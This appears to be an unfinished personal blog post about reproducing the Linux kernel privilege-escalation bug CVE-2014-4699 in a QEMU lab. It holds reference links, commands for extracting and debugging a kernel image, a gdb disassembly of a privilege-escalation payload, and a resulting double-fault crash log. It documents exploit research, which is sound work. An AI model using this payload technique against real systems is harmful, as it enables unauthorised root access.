---
layout: post
comments: true
title: "Resurrect an old vulnerability: CVE-2014-4699"
tags: [CVE, linux, gdb, kernel]
---

http://uaf.io/exploitation/misc/2016/09/10/Kernel-Exploitation-for-Dummies.html
http://snapshot.debian.org/
http://archive.ubuntu.com/ubuntu/pool/main/l/linux/

https://rlworkman.net/system.map/
https://www.elinux.org/Debugging_The_Linux_Kernel_Using_Gdb
https://01.org/linuxgraphics/gfx-docs/drm/dev-tools/gdb-kernel-debugging.html
https://www.kernel.org/doc/html/v4.11/dev-tools/gdb-kernel-debugging.html
https://stackoverflow.com/questions/26271901/is-it-possible-to-use-gdb-and-qemu-to-debug-linux-user-space-programs-and-kernel
https://github.com/torvalds/linux/blob/master/scripts/gdb/vmlinux-gdb.py
https://kernelnewbies.org/FAQ/BUG

[writeup](http://cyseclabs.com/page?n=21072014)
http://blackbunny.io/linux-kernel-x86-64-bypass-smep-kaslr-kptr_restric/
https://github.com/SecWiki/linux-kernel-exploits/tree/master/2014/CVE-2014-4699

```
$ od -t x1 -A d linux_image/boot/vmlinuz-3.2.0-23-generic | grep "1f 8b 08"
0018016 48 8d 83 50 37 4b 00 ff e0 1f 8b 08 00 00 00 00
$ dd if=linux_image/boot/vmlinuz-3.2.0-23-generic bs=1 skip=0018025 | zcat > vmlinux
4947815+0 record dentro
4947815+0 record fuori
4947815 bytes (4,9 MB, 4,7 MiB) copied, 3,25252 s, 1,5 MB/s

gzip: stdin: decompression OK, trailing garbage ignored
$ file vmlinux
vmlinux: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=6171fe7a98b41dfbe7ed9afa8b1c033f3acaff9c, stripped
```

```
$ gcc -g -Wall cve-2014-4699.c -o cve-2014-4699 -static
```

``-static`` because I'm using a ``buildroot`` generated machine without
the library of an Ubuntu installation.

```
gefâž¤  x/30i tmp - 15
   0x8ffffbf1:  nop
   0x8ffffbf2:  nop
   0x8ffffbf3:  swapgs               <--- tmp - 13
   0x8ffffbf6:  call   0x8ffffc00
   0x8ffffbfb:  swapgs 
   0x8ffffbfe:  iretq                <--- end 2nd memcpy()
   0x8ffffc00:  push   rbp           <--- start payload
   0x8ffffc01:  mov    rbp,rsp
   0x8ffffc04:  sub    rsp,0x20
   0x8ffffc08:  mov    QWORD PTR [rbp-0x8],0xffffffff81dd70e8
   0x8ffffc10:  mov    rax,QWORD PTR [rbp-0x8]
   0x8ffffc14:  mov    DWORD PTR [rax],0xffffffff
   0x8ffffc1a:  mov    QWORD PTR [rbp-0x10],0xffffffff81091630
   0x8ffffc22:  mov    QWORD PTR [rbp-0x18],0xffffffff810918e0
   0x8ffffc2a:  mov    rax,QWORD PTR [rbp-0x18]
   0x8ffffc2e:  mov    edi,0x0
   0x8ffffc33:  call   rax
   0x8ffffc35:  mov    rdx,rax
   0x8ffffc38:  mov    rax,QWORD PTR [rbp-0x10]
   0x8ffffc3c:  mov    rdi,rdx
   0x8ffffc3f:  call   rax
   0x8ffffc41:  nop
   0x8ffffc42:  leave  
   0x8ffffc43:  ret
```

```
$ qemu-system-x86_64 \
    -hda output/images/rootfs.ext2 \
    -m 1024 \
    -enable-kvm \
    -kernel linux_image/boot/vmlinuz-3.2.0-23-generic \
    -append 'root=/dev/sda \
    console=tty0 console=ttyS0 rw' \
    -net nic,model=virtio -net user,hostfwd=tcp::2222-:22 \
    -S -s  \
    -serial stdio
 ...
[    7.721360] double fault: 0000 [#1] SMP 
[    7.721360] CPU 0 
[    7.721360] Modules linked in:
[    7.721360] 
[    7.721360] Pid: 121, comm: cve-2014-4699 Not tainted 3.2.0-23-generic #36-Ubuntu QEMU Standard PC (i440FX + PIIX, 1996)
[    7.721360] RIP: 0010:[<000000008ffffbfe>]  [<000000008ffffbfe>] 0x8ffffbfd
[    7.721360] RSP: 0018:ffffffff81dd7010  EFLAGS: 00010046
[    7.721360] RAX: 0000000000000000 RBX: 0000000000000001 RCX: 00000000ffffffff
[    7.721360] RDX: ffffffff81c31b00 RSI: ffffffff81091300 RDI: 0000000000000086
[    7.721360] RBP: ffffffff81dd7068 R08: 0000000000000000 R09: ffff88003ce4c0c0
[    7.721360] R10: 81668e0000106b10 R11: 0000000000000246 R12: ffffffff81dd7078
[    7.721360] R13: 0000000000000000 R14: 81668e0200106a90 R15: 00000000ffffffff
[    7.721360] FS:  0000000001433880(0063) GS:ffff88003fc00000(0000) knlGS:0000000000000000
[    7.721360] CS:  0010 DS: 0000 ES: 0000 CR0: 000000008005003b
[    7.721360] CR2: 000000000000c500 CR3: 000000003cfe8000 CR4: 00000000000006f0
[    7.721360] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
[    7.721360] DR3: 0000000000000000 DR6: 00000000ffff0ff0 DR7: 0000000000000400
[    7.721360] Process cve-2014-4699 (pid: 121, threadinfo ffff88003cff4000, task ffff88003cf9c4d0)
[    7.721360] Stack:
[    7.721360]  0000000000000000 ffffffff8165d06f 0000000000000010 0000000000010046
[    7.721360]  ffffffff81dd7048 0000000000000018 8166ee0000106a10 00000000ffffffff
[    7.721360]  0000000000000001 81668e0000106ac0 00000000ffffffff 00000000ffffffff
[    7.721360] Call Trace:
[    7.721360] Code:  Bad RIP value.
[    7.721360] RIP  [<000000008ffffbfe>] 0x8ffffbfd
[    7.721360]  RSP <ffffffff81dd7010>
[    7.721360] ---[ end trace c1b610693687e90e ]---
```

This is a [double fault](https://en.wikipedia.org/wiki/Double_fault)
